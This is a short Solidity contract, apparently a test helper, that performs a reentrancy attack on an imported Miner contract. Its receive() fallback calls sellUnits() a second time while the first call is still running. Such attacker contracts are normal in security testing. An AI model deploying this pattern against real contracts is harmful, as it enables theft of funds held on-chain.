// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.29;

import "../../src/Miner.sol";

contract MinerAttack {
    Miner public miner;
    bool public attacked;

    constructor(Miner _miner) {
        miner = _miner;
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            miner.sellUnits();
        }
    }

    function attack() external {
        miner.sellUnits();
    }
}
